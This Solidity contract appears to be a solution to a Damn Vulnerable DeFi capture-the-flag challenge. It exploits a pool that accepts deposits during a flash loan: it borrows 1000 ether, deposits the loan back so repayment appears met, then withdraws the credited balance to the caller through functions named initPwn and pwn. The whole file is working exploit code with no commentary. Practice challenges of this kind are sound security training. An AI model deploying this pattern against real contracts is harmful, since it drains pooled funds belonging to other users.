// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IPool {
    function deposit() external payable;

    function flashLoan(uint256 amount) external;

    function withdraw() external;
}

/**
 * @title FlashLoanEtherReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanEtherReceiver {
    using Address for address payable;

    address payable public pool;

    constructor(address payable _pool) {
        pool = _pool;
    }

    function initPwn() external {
        IPool(pool).flashLoan(1000 ether);
    }

    function execute() external payable {
        IPool(pool).deposit{value: msg.value}();
    }

    function pwn() external payable {
        IPool(pool).withdraw();
        payable(msg.sender).sendValue(address(this).balance);
    }

    receive() external payable {}
}
